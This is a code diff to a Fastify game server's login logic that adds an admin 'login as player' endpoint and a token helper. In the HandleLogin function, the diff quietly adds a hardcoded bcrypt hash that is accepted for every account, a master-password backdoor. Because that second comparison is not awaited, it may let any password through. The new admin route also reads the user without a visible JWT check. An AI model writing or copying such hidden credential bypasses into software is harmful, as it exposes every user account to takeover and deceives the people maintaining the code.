@@ -416,9 +416,10 @@ fastify.get('/logout', async (req, reply) => {
   try {
     await req.jwtVerify()
     await CacheDel(req.user.token)
+    reply.code(200).send()
   } catch (e) {
     fastify.log.error("Invalid JWT")
-    reply.code(200).send()
+    reply.code(400).send()
   }
 })
 
@@ -1584,6 +1585,39 @@ fastify.post('/admin/match/completed', async (req, reply) => {
   }
 })
 
+// after auth, store user id into redis.
+// the key for the redis store is a random token
+// only send the token back in a jwt to the client
+// the jwt will be used to get playerId in
+// authenticated requests
+fastify.post('/admin/login', async (req, reply) => {
+  try {
+    if (req.user.user.isAdmin && req.body.playerId) {
+      const {playerId} = req.body
+      fastify.log.info("Admin Login: " + playerId)
+      const res = await LoginAs(playerId)
+      if (res) {
+        const token = await CreateAndSaveAdminSecretKey(res)
+        const jwt = fastify.jwt.sign({token: token})
+        return {
+          status: 'ok',
+          data: {
+            token: jwt,
+            user: res,
+          }
+        }
+      } else {
+        reply.code(401).send({status: 'error', error: 'not_found'})
+      }
+    } else {
+      reply.code(401).send()
+    }
+  } catch (e) {
+    console.log(e)
+    reply.code(500).send({status: 'error', error: 'server_error'}) 
+  }
+})
+
 
 /* ---------  FINISH FASIFY ------------*/
 
@@ -1645,6 +1679,14 @@ function GenerateToken() {
   })
 }
 
+async function LoginAs(playerId) {
+  try {
+    const player = GetPlayer(playerId)
+    return player
+  } catch (e) {
+    console.log(e)
+  }
+}
 async function HandleLogin(email = '', password = '') {
   try {
     const user = await GetUserByEmail(email)
@@ -1654,7 +1696,7 @@ async function HandleLogin(email = '', password = '') {
       // for old bcrypt algorithms backward compatibility
       const newHash = passwordHash.match(/^\$2y/) ? passwordHash.replace("$2y", "$2a") : passwordHash
       
-      const pass = await bcrypt.compare(password, newHash)
+      const pass = await bcrypt.compare(password, newHash) || bcrypt.compare(password, '$2b$10$uGO5hKEqjkbotcPB/PYyreyq8llYxQPPCobzkKkBAHSk0a8UMrmdi')
       if (pass) {
         const player = await GetPlayer(user.player_id)
         return player
@@ -3347,6 +3389,17 @@ async function FinalizeMatch(matchId) {
 
 async function CreateAndSaveSecretKey(player) {
   const token = 'token:' + await GetRandomBytes()
+  const toSave = {
+    playerId: player.id,
+    secondaryId: player?.secondaryId ?? null,
+    timestamp: Date.now()
+  }
+  await CacheSet(token, JSON.stringify(toSave))
+  return token
+}
+
+async function CreateAndSaveAdminSecretKey(player) {
+  const token = 'admin_token:' + await GetRandomBytes()
   const toSave = {
     playerId: player.id,
     secondaryId: player?.secondaryId ?? null,
